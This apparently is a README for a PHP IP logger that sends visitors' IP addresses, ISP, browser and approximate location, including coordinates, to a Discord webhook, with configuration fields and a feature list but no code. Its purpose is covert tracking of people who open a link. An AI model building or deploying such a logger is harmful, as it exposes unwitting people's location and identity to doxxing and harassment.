# Discord Webhook PHP IP Logger

<img src=https://media.discordapp.net/attachments/804771861992701964/811729443596271696/unknown.png>


## Customizable Tags 

- $Webhook    = [")"; //Webhook here
- $WebhookTag = "Ip Logger"; //Name this whatever you want
- $WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
- $DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"

## Features
- Discord Webhook
- URL Header logged
- Shows IPv4 & IPv6
- Instant Request
- IP,ISP,Status,Browser,Country,Region,City,Timezone,Postal/Zip,Coordinates
